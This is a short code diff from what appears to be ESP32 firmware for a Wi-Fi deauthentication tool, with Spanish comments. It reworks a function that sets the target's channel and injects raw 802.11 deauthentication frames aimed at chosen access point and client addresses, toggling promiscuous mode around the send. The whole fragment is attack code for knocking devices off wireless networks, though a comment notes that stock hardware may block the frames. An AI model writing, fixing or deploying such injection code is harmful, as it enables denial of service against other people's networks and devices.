@@ -379,12 +379,34 @@ void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t
   deauth_frame[24] = reason_code;
   deauth_frame[25] = 0x00; // Padding
   
-  // Enviar frame raw por la interfaz STA
-  // Parámetro false = no incluir FCS (el hardware lo calcula automáticamente)
+  // Intento de inyección en ESP32 vanilla:
+  // 1. Desactivar temporalmente el modo promiscuous (puede interferir con TX)
+  // 2. Fijar el canal objetivo
+  // 3. Enviar frame con esp_wifi_80211_tx
+  // 4. Reactivar promiscuous mode
+  
+  // Desactivar modo promiscuous para evitar interferencias con TX
+  esp_wifi_set_promiscuous(false);
+  
+  // Esperar un momento para que se estabilice
+  vTaskDelay(pdMS_TO_TICKS(10));
+  
+  // Fijar canal del objetivo
+  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+  vTaskDelay(pdMS_TO_TICKS(30)); // Esperar que el canal se active
+  
+  // Enviar frame raw
+  // En teoría, en modo STA activo (no asociada), esp_wifi_80211_tx debería permitir envío
+  // pero ESP32 vanilla bloquea frames management (0xC0) cuando no está asociado
   esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
   if (ret != ESP_OK) {
     Serial.printf("[DEAUTH] ERR: esp_wifi_80211_tx failed (0x%x)\n", ret);
   }
+  
+  // Reactivar modo promiscuous
+  vTaskDelay(pdMS_TO_TICKS(10));
+  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
+  esp_wifi_set_promiscuous(true);
 }
 
 // Variables globales para tarea de clients no-bloqueante
